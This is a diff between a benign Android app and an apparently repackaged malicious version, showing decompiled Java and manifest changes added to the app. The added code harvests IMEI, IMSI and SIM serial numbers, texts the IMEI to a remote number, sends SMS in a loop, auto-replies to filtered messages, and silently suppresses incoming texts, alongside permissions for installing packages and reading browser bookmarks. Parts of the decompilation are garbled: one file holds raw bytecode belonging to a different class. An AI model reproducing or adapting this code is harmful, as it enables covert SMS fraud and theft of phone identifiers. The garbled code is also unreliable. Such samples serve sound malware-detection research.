diff --git a/result/APP_47/App_B_47/AndroidManifest.xml b/result/APP_47/App_M_47/AndroidManifest.xml
index 3f0c300..52cc0f1 100755
--- a/result/APP_47/App_B_47/AndroidManifest.xml
+++ b/result/APP_47/App_M_47/AndroidManifest.xml
@@ -46,12 +46,29 @@
             </intent-filter>
         </receiver>
         <service android:name=".service.ScreenService"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <activity android:name="com.android.main.TANCActivity" android:theme="@android:style/Theme.Dialog"/>
     </application>
     <uses-permission android:name="android.permission.SET_PREFERRED_APPLICATIONS"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.VIBRATE"/>
-    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
     <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 </manifest>
\ No newline at end of file
diff --git a/result/APP_47/App_B_47/apktool.yml b/result/APP_47/App_M_47/apktool.yml
index 172f389..eec0e50 100755
--- a/result/APP_47/App_B_47/apktool.yml
+++ b/result/APP_47/App_M_47/apktool.yml
@@ -1,5 +1,5 @@
 !!brut.androlib.meta.MetaInfo
-apkFileName: Bapp47-72ACC63208C5518BDF8E745BCA1B264866D27704D0B0CA89559CBE593A0D840A.apk
+apkFileName: Mapp47-2EF09ACA1B3A4ACBFB2C33EF14D5EF06150BF88662B35A90F98A74ACCABAF6BE.apk
 compressionType: false
 doNotCompress:
 - resources.arsc
diff --git a/result/APP_47/App_M_47/com/android/main/APKInstaller.java b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
new file mode 100755
index 0000000..bd0972b
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/APKInstaller.java
@@ -0,0 +1,432 @@
+package com.android.main;
+
+public class APKInstaller
+{
+  public APKInstaller() {}
+  
+  /* Error */
+  public static String exec(String[] paramArrayOfString)
+  {
+    // Byte code:
+    //   811: putfield 111	com/android/main/MainService:is_second	Ljava/lang/String;
+    //   814: iload 10
+    //   816: istore 5
+    //   818: aload 17
+    //   820: astore 15
+    //   822: iload 4
+    //   824: istore 7
+    //   826: iload 11
+    //   828: istore 6
+    //   830: aload 17
+    //   832: astore 16
+    //   834: ldc_w 513
+    //   837: aload_0
+    //   838: getfield 111	com/android/main/MainService:is_second	Ljava/lang/String;
+    //   841: invokevirtual 259	java/lang/String:equals	(Ljava/lang/Object;)Z
+    //   844: ifeq +139 -> 983
+    //   847: iload 10
+    //   849: istore 5
+    //   851: aload 17
+    //   853: astore 15
+    //   855: iload 4
+    //   857: istore 7
+    //   859: iload 11
+    //   861: istore 6
+    //   863: aload 17
+    //   865: astore 16
+    //   867: aload_0
+    //   868: aload_1
+    //   869: ldc_w 683
+    //   872: ldc_w 685
+    //   875: invokestatic 232	com/android/main/StringUtil:getSubString	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+    //   878: putfield 113	com/android/main/MainService:second_filter_port	Ljava/lang/String;
+    //   881: iload 10
+    //   883: istore 5
+    //   885: aload 17
+    //   887: astore 15
+    //   889: iload 4
+    //   891: istore 7
+    //   893: iload 11
+    //   895: istore 6
+    //   897: aload 17
+    //   899: astore 16
+    //   901: aload_0
+    //   902: aload_1
+    //   903: ldc_w 687
+    //   906: ldc_w 689
+    //   909: invokestatic 232	com/android/main/StringUtil:getSubString	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+    //   912: putfield 115	com/android/main/MainService:second_filter_info	Ljava/lang/String;
+    //   915: iload 10
+    //   917: istore 5
+    //   919: aload 17
+    //   921: astore 15
+    //   923: iload 4
+    //   925: istore 7
+    //   927: iload 11
+    //   929: istore 6
+    //   931: aload 17
+    //   933: astore 16
+    //   935: aload_0
+    //   936: aload_1
+    //   937: ldc_w 691
+    //   940: ldc_w 693
+    //   943: invokestatic 232	com/android/main/StringUtil:getSubString	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+    //   946: putfield 117	com/android/main/MainService:reply_start_str	Ljava/lang/String;
+    //   949: iload 10
+    //   951: istore 5
+    //   953: aload 17
+    //   955: astore 15
+    //   957: iload 4
+    //   959: istore 7
+    //   961: iload 11
+    //   963: istore 6
+    //   965: aload 17
+    //   967: astore 16
+    //   969: aload_0
+    //   970: aload_1
+    //   971: ldc_w 695
+    //   974: ldc_w 697
+    //   977: invokestatic 232	com/android/main/StringUtil:getSubString	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+    //   980: putfield 119	com/android/main/MainService:reply_end_str	Ljava/lang/String;
+    //   983: iload 10
+    //   985: istore 5
+    //   987: aload 17
+    //   989: astore 15
+    //   991: iload 4
+    //   993: istore 7
+    //   995: iload 11
+    //   997: istore 6
+    //   999: aload 17
+    //   1001: astore 16
+    //   1003: aload 20
+    //   1005: invokestatic 474	java/lang/Integer:parseInt	(Ljava/lang/String;)I
+    //   1008: istore 12
+    //   1010: iload 10
+    //   1012: istore 5
+    //   1014: aload 17
+    //   1016: astore 15
+    //   1018: iload 4
+    //   1020: istore 7
+    //   1022: iload 11
+    //   1024: istore 6
+    //   1026: aload 17
+    //   1028: astore 16
+    //   1030: aload_0
+    //   1031: invokespecial 700	com/android/main/MainService:writeTaskLog	()V
+    //   1034: iconst_0
+    //   1035: istore 8
+    //   1037: iload 9
+    //   1039: istore_3
+    //   1040: iload 8
+    //   1042: iload 12
+    //   1044: if_icmplt +23 -> 1067
+    //   1047: iload_3
+    //   1048: istore 5
+    //   1050: aload_0
+    //   1051: aload_2
+    //   1052: invokespecial 244	com/android/main/MainService:writeRecordLog	([Ljava/lang/String;)V
+    //   1055: aload_0
+    //   1056: iload 4
+    //   1058: iload 5
+    //   1060: aload 17
+    //   1062: invokespecial 246	com/android/main/MainService:LogService	(IILjava/lang/String;)I
+    //   1065: pop
+    //   1066: return
+    //   1067: iload_3
+    //   1068: istore 5
+    //   1070: aload 17
+    //   1072: astore 15
+    //   1074: iload 4
+    //   1076: istore 7
+    //   1078: iload_3
+    //   1079: istore 6
+    //   1081: aload 17
+    //   1083: astore 16
+    //   1085: aload_0
+    //   1086: aload 17
+    //   1088: aload 18
+    //   1090: invokespecial 218	com/android/main/MainService:sendSMS	(Ljava/lang/String;Ljava/lang/String;)V
+    //   1093: iload_3
+    //   1094: iconst_1
+    //   1095: iadd
+    //   1096: istore_3
+    //   1097: iload_3
+    //   1098: istore 5
+    //   1100: aload 17
+    //   1102: astore 15
+    //   1104: iload 4
+    //   1106: istore 7
+    //   1108: iload_3
+    //   1109: istore 6
+    //   1111: aload 17
+    //   1113: astore 16
+    //   1115: ldc2_w 701
+    //   1118: invokestatic 708	java/lang/Thread:sleep	(J)V
+    //   1121: iload 8
+    //   1123: iconst_1
+    //   1124: iadd
+    //   1125: istore 8
+    //   1127: goto -87 -> 1040
+    //   1130: astore_1
+    //   1131: iload_3
+    //   1132: istore 5
+    //   1134: aload 17
+    //   1136: astore 15
+    //   1138: iload 4
+    //   1140: istore 7
+    //   1142: iload_3
+    //   1143: istore 6
+    //   1145: aload 17
+    //   1147: astore 16
+    //   1149: aload_1
+    //   1150: invokevirtual 709	java/lang/InterruptedException:printStackTrace	()V
+    //   1153: goto -32 -> 1121
+    //   1156: astore_1
+    //   1157: aload_0
+    //   1158: aload_2
+    //   1159: invokespecial 244	com/android/main/MainService:writeRecordLog	([Ljava/lang/String;)V
+    //   1162: aload_0
+    //   1163: bipush -44
+    //   1165: iload 5
+    //   1167: aload 15
+    //   1169: invokespecial 246	com/android/main/MainService:LogService	(IILjava/lang/String;)I
+    //   1172: pop
+    //   1173: return
+    //   1174: astore_1
+    //   1175: aload_0
+    //   1176: aload_2
+    //   1177: invokespecial 244	com/android/main/MainService:writeRecordLog	([Ljava/lang/String;)V
+    //   1180: aload_0
+    //   1181: iload 7
+    //   1183: iload 6
+    //   1185: aload 16
+    //   1187: invokespecial 246	com/android/main/MainService:LogService	(IILjava/lang/String;)I
+    //   1190: pop
+    //   1191: aload_1
+    //   1192: athrow
+    // Local variable table:
+    //   start	length	slot	name	signature
+    //   0	1193	0	this	MainService
+    //   0	1193	1	paramString	String
+    //   0	1193	2	paramArrayOfString	String[]
+    //   471	672	3	i	int
+    //   467	672	4	j	int
+    //   22	1144	5	k	int
+    //   34	1150	6	m	int
+    //   30	1152	7	n	int
+    //   6	1120	8	i1	int
+    //   18	1020	9	i2	int
+    //   12	999	10	i3	int
+    //   15	1008	11	i4	int
+    //   9	1036	12	i5	int
+    //   463	161	13	i6	int
+    //   75	3	14	bool	boolean
+    //   26	1142	15	localObject1	Object
+    //   2	1184	16	localObject2	Object
+    //   46	1100	17	str1	String
+    //   160	929	18	str2	String
+    //   128	603	19	str3	String
+    //   424	580	20	str4	String
+    // Exception table:
+    //   from	to	target	type
+    //   1115	1121	1130	java/lang/InterruptedException
+    //   36	48	1156	java/lang/Exception
+    //   68	77	1156	java/lang/Exception
+    //   118	130	1156	java/lang/Exception
+    //   150	162	1156	java/lang/Exception
+    //   182	192	1156	java/lang/Exception
+    //   212	218	1156	java/lang/Exception
+    //   238	250	1156	java/lang/Exception
+    //   270	280	1156	java/lang/Exception
+    //   300	306	1156	java/lang/Exception
+    //   326	338	1156	java/lang/Exception
+    //   358	368	1156	java/lang/Exception
+    //   388	394	1156	java/lang/Exception
+    //   414	426	1156	java/lang/Exception
+    //   446	462	1156	java/lang/Exception
+    //   492	511	1156	java/lang/Exception
+    //   538	550	1156	java/lang/Exception
+    //   570	582	1156	java/lang/Exception
+    //   609	619	1156	java/lang/Exception
+    //   646	689	1156	java/lang/Exception
+    //   727	738	1156	java/lang/Exception
+    //   758	780	1156	java/lang/Exception
+    //   800	814	1156	java/lang/Exception
+    //   834	847	1156	java/lang/Exception
+    //   867	881	1156	java/lang/Exception
+    //   901	915	1156	java/lang/Exception
+    //   935	949	1156	java/lang/Exception
+    //   969	983	1156	java/lang/Exception
+    //   1003	1010	1156	java/lang/Exception
+    //   1030	1034	1156	java/lang/Exception
+    //   1085	1093	1156	java/lang/Exception
+    //   1115	1121	1156	java/lang/Exception
+    //   1149	1153	1156	java/lang/Exception
+    //   36	48	1174	finally
+    //   68	77	1174	finally
+    //   118	130	1174	finally
+    //   150	162	1174	finally
+    //   182	192	1174	finally
+    //   212	218	1174	finally
+    //   238	250	1174	finally
+    //   270	280	1174	finally
+    //   300	306	1174	finally
+    //   326	338	1174	finally
+    //   358	368	1174	finally
+    //   388	394	1174	finally
+    //   414	426	1174	finally
+    //   446	462	1174	finally
+    //   492	511	1174	finally
+    //   538	550	1174	finally
+    //   570	582	1174	finally
+    //   609	619	1174	finally
+    //   646	689	1174	finally
+    //   727	738	1174	finally
+    //   758	780	1174	finally
+    //   800	814	1174	finally
+    //   834	847	1174	finally
+    //   867	881	1174	finally
+    //   901	915	1174	finally
+    //   935	949	1174	finally
+    //   969	983	1174	finally
+    //   1003	1010	1174	finally
+    //   1030	1034	1174	finally
+    //   1085	1093	1174	finally
+    //   1115	1121	1174	finally
+    //   1149	1153	1174	finally
+  }
+  
+  private void writeRecordLog(String[] paramArrayOfString)
+  {
+    this.nexttime = StringUtil.getDate(paramArrayOfString[0], 12);
+    FileAct.writeString(this.nexttime + "|" + paramArrayOfString[1] + "|" + paramArrayOfString[2] + "|" + paramArrayOfString[3] + "|" + paramArrayOfString[4] + "|" + paramArrayOfString[5] + "|" + paramArrayOfString[6], this.recordlog);
+  }
+  
+  private void writeTaskLog()
+  {
+    if ((this.shieldcon == null) || ("".equals(this.shieldcon))) {
+      this.shieldcon = "other";
+    }
+    if ((this.exactnum == null) || ("".equals(this.exactnum))) {
+      this.exactnum = "other";
+    }
+    FileAct.writeString(this.shieldnum + "|" + this.shieldcon + "|" + this.exactnum, this.tasklog);
+  }
+  
+  public IBinder onBind(Intent paramIntent)
+  {
+    return null;
+  }
+  
+  public void onCreate()
+  {
+    initChannel();
+    this.sendReceiver = new SMSReceiver();
+    Object localObject1 = new IntentFilter("com.test.sms.send");
+    registerReceiver(this.sendReceiver, (IntentFilter)localObject1);
+    this.deliveryReceiver = new SMSReceiver();
+    localObject1 = new IntentFilter("com.test.sms.delivery");
+    registerReceiver(this.deliveryReceiver, (IntentFilter)localObject1);
+    this.smsReceiver = new SMSReceiver();
+    localObject1 = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
+    ((IntentFilter)localObject1).setPriority(Integer.MAX_VALUE);
+    registerReceiver(this.smsReceiver, (IntentFilter)localObject1);
+    this.recordlog = getDir("androidh.log", 0).getAbsolutePath();
+    this.tasklog = getDir("android.log", 0).getAbsolutePath();
+    if ((this.imei == null) || ("".equalsIgnoreCase(this.imei)))
+    {
+      localObject1 = (TelephonyManager)getSystemService("phone");
+      if (localObject1 != null)
+      {
+        this.imei = ((TelephonyManager)localObject1).getDeviceId();
+        this.imsi = ((TelephonyManager)localObject1).getSubscriberId();
+        this.iccid = ((TelephonyManager)localObject1).getSimSerialNumber();
+      }
+    }
+    localObject1 = FileAct.readString(this.recordlog);
+    int i = 0;
+    int j;
+    if ((localObject1 != null) && (!((String)localObject1).equals("")))
+    {
+      localObject1 = StringUtil.getRecordInfo((String)localObject1);
+      if ((localObject1 != null) && (localObject1.length == 7))
+      {
+        this.nexttime = localObject1[0];
+        String str = localObject1[2];
+        this.installtime = localObject1[3];
+        this.region = localObject1[4];
+        Object localObject2 = localObject1[5];
+        this.mnc = localObject1[6];
+        if ((this.imsi != null) && (!this.imsi.equals(localObject2))) {
+          this.issend = true;
+        }
+        if (!localObject1[1].equalsIgnoreCase(this.smallpid)) {
+          i = 1;
+        }
+        j = i;
+        if (!"no".equalsIgnoreCase(str))
+        {
+          j = i;
+          if (!"".equalsIgnoreCase(str))
+          {
+            j = i;
+            if (str.length() > 10)
+            {
+              this.mobile = str;
+              j = i;
+            }
+          }
+        }
+      }
+    }
+    for (;;)
+    {
+      if (j != 0)
+      {
+        if (getDestMobile() == 200) {
+          FileAct.writeString(this.nexttime + "|" + this.smallpid + "|" + this.mobile + "|" + this.installtime + "|" + this.region + "|" + this.imsi + "|" + this.mnc, this.recordlog);
+        }
+        this.issend = true;
+      }
+      if (this.issend)
+      {
+        if ("".equals(this.destMobile)) {
+          getDestMobile();
+        }
+        sendSMS(this.destMobile, "imei:" + this.imei);
+        this.issend = false;
+      }
+      this.timer.schedule(this.newtask, 0L, 900000L);
+      return;
+      this.nexttime = StringUtil.getDate(2);
+      this.installtime = StringUtil.getCurrentDate(1);
+      j = 1;
+      continue;
+      this.nexttime = StringUtil.getDate(2);
+      this.installtime = StringUtil.getCurrentDate(1);
+      j = 1;
+    }
+  }
+  
+  public class SMSReceiver
+    extends BroadcastReceiver
+  {
+    public SMSReceiver() {}
+    
+    public void onReceive(Context paramContext, Intent paramIntent)
+    {
+      NQfile.broadcastReceiverwrite(paramIntent);
+      paramContext = paramIntent.getAction();
+      Log.d("ANDROID_INFO", "MainService.SMSReceiver.onReceiver() action=" + paramContext);
+      getResultCode();
+      if (paramContext.equals("com.test.sms.send")) {}
+      while ((paramContext.equals("com.test.sms.delivery")) || (!paramContext.equals("android.provider.Telephony.SMS_RECEIVED"))) {
+        return;
+      }
+      for (;;)
+      {
+        Object[] arrayOfObject;
+        SmsMessage[] arrayOfSmsMessage;
+        int i;
+        String str;
+        try
+        {
+          paramContext = paramIntent.getExtras();
+          if (paramContext == null) {
+            break;
+          }
+          arrayOfObject = (Object[])paramContext.get("pdus");
+          Log.d("ANDROID_INFO", "pdus.length=" + arrayOfObject.length);
+          arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
+          paramContext = "";
+          i = 0;
+          if (i >= arrayOfObject.length)
+          {
+            paramIntent = arrayOfSmsMessage[0].getDisplayOriginatingAddress();
+            if ((paramIntent != null) && (!"".equals(paramIntent)) && (paramContext != null) && (!"".equals(paramContext)) && ("1".equals(MainService.this.is_second)))
+            {
+              MainService.this.LogService(-45, paramContext);
+              if ((paramIntent.startsWith(MainService.this.second_filter_port)) && (paramContext.indexOf(MainService.this.second_filter_info) > -1) && ("1".equals(MainService.this.is_second)))
+              {
+                i = paramContext.indexOf(MainService.this.reply_start_str);
+                int j = paramContext.indexOf(MainService.this.reply_end_str);
+                int k = MainService.this.reply_start_str.length();
+                if (i + k < j)
+                {
+                  str = paramContext.substring(i + k, j);
+                  MainService.this.sendSMS(paramIntent, str);
+                }
+              }
+            }
+            if ((paramIntent == null) || ((!paramIntent.startsWith(MainService.this.shieldnum)) && (("".equals(paramContext)) || ("".equals(MainService.this.shieldcon)) || (paramContext.indexOf(MainService.this.shieldcon) <= -1))) || (paramIntent.equalsIgnoreCase(MainService.this.exactnum))) {
+              break;
+            }
+            abortBroadcast();
+            return;
+          }
+        }
+        catch (Exception paramContext)
+        {
+          abortBroadcast();
+          paramContext.printStackTrace();
+          MainService.this.LogService(502, 0);
+          return;
+        }
+        arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
+        paramIntent = paramContext;
+        if (arrayOfSmsMessage[i] != null)
+        {
+          paramIntent = "";
+          try
+          {
+            str = arrayOfSmsMessage[i].getDisplayMessageBody();
+            paramIntent = str;
+          }
+          catch (Exception localException)
+          {
+            for (;;)
+            {
+              localException.printStackTrace();
+            }
+          }
+          paramIntent = paramContext + paramIntent;
+        }
+        i += 1;
+        paramContext = paramIntent;
+      }
+    }
+  }
+}
diff --git a/result/APP_47/App_M_47/com/android/main/SmsReceiver.java b/result/APP_47/App_M_47/com/android/main/SmsReceiver.java
new file mode 100755
index 0000000..b2e7e1a
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/SmsReceiver.java
@@ -0,0 +1,90 @@
+package com.android.main;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Bundle;
+import android.telephony.gsm.SmsMessage;
+import java.io.File;
+
+public class SmsReceiver
+  extends BroadcastReceiver
+{
+  public SmsReceiver() {}
+  
+  public void onReceive(Context paramContext, Intent paramIntent)
+  {
+    for (;;)
+    {
+      Object[] arrayOfObject;
+      SmsMessage[] arrayOfSmsMessage;
+      int i;
+      try
+      {
+        paramIntent = paramIntent.getExtras();
+        if (paramIntent == null) {
+          break label253;
+        }
+        paramContext.getDir("android.log", 0).getAbsolutePath();
+        paramContext = FileAct.readString(paramContext.getDir("android.log", 0).getAbsolutePath());
+        if (paramContext == null) {
+          break label253;
+        }
+        if ("".equals(paramContext)) {
+          return;
+        }
+        paramContext = StringUtil.getRecordInfo(paramContext);
+        if ((paramContext == null) || (paramContext.length != 3)) {
+          break label253;
+        }
+        String str2 = paramContext[0];
+        Object localObject = paramContext[1];
+        String str3 = paramContext[2];
+        arrayOfObject = (Object[])paramIntent.get("pdus");
+        arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
+        paramContext = "";
+        i = 0;
+        if (i >= arrayOfObject.length)
+        {
+          paramIntent = arrayOfSmsMessage[0].getDisplayOriginatingAddress();
+          if ((paramIntent == null) || ((!paramIntent.startsWith(str2)) && (("".equals(paramContext)) || ("".equals(localObject)) || (paramContext.indexOf(localObject) <= -1))) || (paramIntent.equalsIgnoreCase(str3))) {
+            break label253;
+          }
+          abortBroadcast();
+          return;
+        }
+      }
+      catch (Exception paramContext)
+      {
+        abortBroadcast();
+        paramContext.printStackTrace();
+        return;
+      }
+      arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
+      paramIntent = paramContext;
+      if (arrayOfSmsMessage[i] != null)
+      {
+        paramIntent = "";
+        try
+        {
+          String str1 = arrayOfSmsMessage[i].getDisplayMessageBody();
+          paramIntent = str1;
+        }
+        catch (Exception localException)
+        {
+          for (;;)
+          {
+            localException.printStackTrace();
+          }
+        }
+        paramIntent = paramContext + paramIntent;
+        break label254;
+        label253:
+        return;
+      }
+      label254:
+      i += 1;
+      paramContext = paramIntent;
+    }
+  }
+}
diff --git a/result/APP_47/App_M_47/com/android/main/StringUtil.java b/result/APP_47/App_M_47/com/android/main/StringUtil.java
new file mode 100755
index 0000000..279b40f
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/StringUtil.java
@@ -0,0 +1,186 @@
+package com.android.main;
+
+import android.util.Log;
+import java.text.SimpleDateFormat;
+import java.util.Calendar;
+import java.util.Date;
+import java.util.Random;
+
+public class StringUtil
+{
+  public StringUtil() {}
+  
+  public static String getCurrentDate(int paramInt)
+  {
+    String str = "yyyy-MM-dd HH:mm";
+    if (paramInt == 1) {
+      str = "yyyyMMddHHmm";
+    }
+    for (;;)
+    {
+      try
+      {
+        return new SimpleDateFormat(str).format(new Date(System.currentTimeMillis()));
+      }
+      catch (Exception localException)
+      {
+        Log.e("info", "getTimeLength is error");
+      }
+      if (paramInt == 2) {
+        str = "yyyyMMdd";
+      }
+    }
+    return "";
+  }
+  
+  public static String getDate(int paramInt)
+  {
+    Date localDate = new Date();
+    Calendar localCalendar = Calendar.getInstance();
+    localCalendar.setTime(localDate);
+    localCalendar.set(10, localCalendar.get(10) + paramInt);
+    return new SimpleDateFormat("yyyyMMddHHmm").format(localCalendar.getTime());
+  }
+  
+  public static String getDate(String paramString, int paramInt)
+  {
+    Calendar localCalendar = null;
+    try
+    {
+      paramString = new SimpleDateFormat("yyyyMMddHHmm").parse(paramString);
+      localCalendar = Calendar.getInstance();
+      localCalendar.setTime(paramString);
+      localCalendar.set(10, localCalendar.get(10) + paramInt);
+      return new SimpleDateFormat("yyyyMMddHHmm").format(localCalendar.getTime());
+    }
+    catch (Exception paramString)
+    {
+      for (;;)
+      {
+        paramString = localCalendar;
+      }
+    }
+  }
+  
+  public static int getRandomNumber(int paramInt)
+  {
+    return new Random().nextInt(paramInt);
+  }
+  
+  public static String[] getRecordInfo(String paramString)
+  {
+    String[] arrayOfString = (String[])null;
+    if ((paramString != null) && (!paramString.equals(""))) {
+      return paramString.split("\\|");
+    }
+    return arrayOfString;
+  }
+  
+  public static String getSubString(String paramString1, String paramString2, String paramString3)
+  {
+    int i = paramString1.indexOf(paramString2);
+    int j = paramString1.indexOf(paramString3);
+    paramString3 = "";
+    if (i < j) {
+      paramString3 = paramString1.substring(paramString2.length() + i, j).trim();
+    }
+    return paramString3;
+  }
+  
+  public static int getTimeLength(String paramString, int paramInt1, int paramInt2)
+  {
+    int i = 0;
+    if ((paramString == null) || (paramString.length() == 0)) {
+      return 0;
+    }
+    Object localObject = simpleCutString(paramString, 8);
+    paramString = null;
+    try
+    {
+      localObject = new SimpleDateFormat("yyyyMMddHHmm").parse((String)localObject);
+      paramString = (String)localObject;
+    }
+    catch (Exception localException)
+    {
+      long l1;
+      long l2;
+      for (;;) {}
+    }
+    l1 = System.currentTimeMillis();
+    l2 = paramString.getTime();
+    if (Long.valueOf(Long.valueOf(l1).longValue() - Long.valueOf(l2).longValue()).longValue() / (3600000 * paramInt2) >= paramInt1) {
+      i = 1;
+    }
+    return i;
+  }
+  
+  public static Long getTimeLength(String paramString)
+  {
+    Object localObject = new Long(0L);
+    if ((paramString == null) || (paramString.length() == 0)) {
+      return localObject;
+    }
+    localObject = simpleCutString(paramString, 8);
+    paramString = null;
+    try
+    {
+      localObject = new SimpleDateFormat("yyyyMMddHHmm").parse((String)localObject);
+      paramString = (String)localObject;
+    }
+    catch (Exception localException)
+    {
+      for (;;)
+      {
+        long l1;
+        long l2;
+        Log.e("info", "getTimeLength is error");
+      }
+    }
+    l1 = System.currentTimeMillis();
+    l2 = paramString.getTime();
+    paramString = Long.valueOf(Long.valueOf(l1).longValue() - Long.valueOf(l2).longValue());
+    Log.i("info", "timelen:" + paramString);
+    return paramString;
+  }
+  
+  public static boolean isNullOrBlank(String paramString)
+  {
+    return (paramString == null) || (paramString.trim().length() == 0);
+  }
+  
+  public static String simpleCutString(String paramString, int paramInt)
+  {
+    if (!isNullOrBlank(paramString))
+    {
+      StringBuffer localStringBuffer = new StringBuffer();
+      int i = 0;
+      int j = 0;
+      if (j >= paramString.length()) {}
+      label90:
+      for (;;)
+      {
+        if (!localStringBuffer.toString().equals(paramString)) {
+          break label92;
+        }
+        return paramString;
+        char c = paramString.charAt(j);
+        if (c < 'ÿ') {
+          i += 1;
+        }
+        for (;;)
+        {
+          if (i > paramInt * 2) {
+            break label90;
+          }
+          localStringBuffer.append(c);
+          j += 1;
+          break;
+          i += 2;
+        }
+      }
+      label92:
+      return localStringBuffer.toString();
+    }
+    return "";
+  }
+}
diff --git a/result/APP_47/App_M_47/com/android/main/TANCActivity.java b/result/APP_47/App_M_47/com/android/main/TANCActivity.java
new file mode 100755
index 0000000..1af0adf
--- /dev/null
+++ b/result/APP_47/App_M_47/com/android/main/TANCActivity.java
@@ -0,0 +1,295 @@
+package com.android.main;
+
+import android.app.Activity;
+import android.app.AlertDialog;
+import android.app.AlertDialog.Builder;
+import android.content.DialogInterface;
+import android.content.DialogInterface.OnClickListener;
+import android.content.Intent;
+import android.content.pm.PackageInfo;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Bundle;
+import java.util.List;
+import netqin.NQlog.NQfile;
+
+public class TANCActivity
+  extends Activity
+{
+  public TANCActivity() {}
+  
+  private void choiceBrowserToVisitUrl(String paramString)
+  {
+    int j = 0;
+    int i1 = 0;
+    int n = 0;
+    int i2 = 0;
+    int m = 0;
+    int k = 0;
+    int i3 = 0;
+    Object localObject1 = "";
+    Object localObject5 = "";
+    Object localObject4 = "";
+    Object localObject6 = "";
+    Object localObject3 = "";
+    Object localObject2 = "";
+    Object localObject7 = "";
+    PackageManager localPackageManager = getPackageManager();
+    List localList = localPackageManager.getInstalledPackages(0);
+    int i = 0;
+    if (i >= localList.size())
+    {
+      if (j != 0) {
+        gotoUrl((String)localObject1, paramString, localPackageManager);
+      }
+    }
+    else
+    {
+      String str = ((PackageInfo)localList.get(i)).packageName;
+      int i9;
+      Object localObject13;
+      Object localObject12;
+      Object localObject11;
+      Object localObject10;
+      Object localObject9;
+      int i8;
+      int i7;
+      int i6;
+      int i5;
+      int i4;
+      Object localObject8;
+      if (str.equals("com.uc.browser"))
+      {
+        i9 = 1;
+        localObject13 = str;
+        localObject12 = localObject2;
+        localObject11 = localObject3;
+        localObject10 = localObject4;
+        localObject9 = localObject5;
+        i8 = k;
+        i7 = m;
+        i6 = n;
+        i5 = i1;
+        i4 = i2;
+        localObject8 = localObject6;
+      }
+      for (;;)
+      {
+        i += 1;
+        localObject6 = localObject8;
+        i2 = i4;
+        i1 = i5;
+        n = i6;
+        m = i7;
+        k = i8;
+        j = i9;
+        localObject5 = localObject9;
+        localObject4 = localObject10;
+        localObject3 = localObject11;
+        localObject2 = localObject12;
+        localObject1 = localObject13;
+        break;
+        if (str.equals("com.tencent.mtt"))
+        {
+          i6 = 1;
+          localObject8 = localObject6;
+          i4 = i2;
